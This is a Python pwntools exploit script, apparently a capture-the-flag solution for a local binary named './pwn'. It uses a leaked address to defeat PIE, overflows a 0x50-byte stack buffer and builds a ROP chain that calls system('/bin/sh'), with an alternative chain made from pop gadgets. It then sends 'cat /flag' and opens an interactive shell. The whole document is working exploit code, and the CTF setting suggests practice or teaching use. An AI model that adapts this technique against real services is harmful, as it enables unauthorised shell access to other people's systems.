# coding=utf-8
from pwn import *

context.arch = "amd64"
s = process('./pwn')
# p = remote('localhost',42287)
elf = ELF('./pwn')

s.recvuntil("0x")
leak = int(s.recvline()[:-1], 16)
vuln = elf.sym['vuln']
elf.address = leak - vuln
# bin_sh = elf.sym['otto']
bin_sh = elf.search(b'/bin/sh').__next__()
system = elf.plt['system']


def func1():
    global rop
    rop = ROP(elf)
    rop.raw(b'a' * (0x50 + 8))
    rop.call(system, [bin_sh, 0])  # 加个0用来栈对齐的
    s.send(rop.chain())


def func2():
    pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi_r15 = ROP(elf).find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
    payload1 = flat(b'a' * (0x50 + 8), pop_rdi, bin_sh, pop_rsi_r15, 0, 0, system, 0)
    s.send(payload1)


func1()
# func2()

s.sendline('cat /flag')
s.interactive()
